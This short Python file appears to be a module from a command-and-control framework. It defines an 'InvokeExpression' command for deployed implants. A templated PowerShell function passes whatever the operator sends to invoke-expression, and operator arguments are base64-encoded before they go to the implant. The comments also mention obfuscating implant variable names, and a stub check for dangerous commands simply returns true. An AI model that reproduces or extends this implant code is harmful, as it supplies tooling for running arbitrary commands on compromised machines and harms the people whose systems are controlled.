import base64


class InvokeExpression:
    # Module notes:
    #   IM should be renames to IE, after initial testing.
    type = "IM"
    args = "Module name"
    input = "exec_module"
    # this must be unique across ALL implants, any matching keys will be merged causing errors.
    # To safely format this use the following format "<type>_variablename":"value" i.e.
    #   fd_base64_var: base64filecontents
    obfuscation_keypairs = {}

    def process_implant_response(self, data, args):
        return f"Exec'ing module: {args}\n{data.decode()}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_invoke_module }} ($data) {
    $global:tr = invoke-expression "$data"
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True

    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the string which is send to the implant
        # Format for the implant core string is:
        #   < command type > <command id><optional command arguments>
        encoded_arg = base64.b64encode(cmd_entry['args'].encode()).decode()

        return f"{encoded_arg}"
